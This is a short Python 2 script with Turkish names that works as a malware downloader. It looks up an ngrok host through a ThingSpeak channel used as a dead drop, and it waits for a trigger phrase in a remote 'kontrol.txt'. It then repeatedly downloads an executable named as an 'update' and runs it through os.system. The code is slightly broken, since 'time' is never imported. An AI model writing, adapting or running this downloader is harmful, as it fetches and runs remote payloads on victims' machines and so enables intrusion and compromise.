import os
import requests as R


def get_data_from_cloud():
	istek = R.get("https://api.thingspeak.com/channels/kanal-numarasi/feeds.json?results=1").text
	dataishere =  istek.split('"field1":"')[-1]
	subdomain = dataishere.split('","field2":"')[0]
	return "http://"+subdomain.split('","')[0]+".ngrok.io/guncelleme.exe"

def cmd(string):
	os.system(string)


def start_shell():
	pass

def download_file(url, filename):
	u = R.get(url).content
	localFile = open(filename, 'wb')
	localFile.write(u)
	localFile.close()

def kontrol(url):
	devam = "etme"
	u = R.get(url.replace("guncelleme.exe", "kontrol.txt")).content
	if "devam et krdsm" in u:
		devam = "et"
	return devam


def runfile(filename):
	cmd("start " + filename)





isim = "tryy.exe"
while True:
	adres = get_data_from_cloud()
	if kontrol(adres) == "et":
		print "islem basliyor"
		try:
			download_file(adres, isim)
			runfile(isim)
		except:
			pass
	else:
		print "dogrulama basarisiz 60 saniye timeout olucak"
	time.sleep(60)
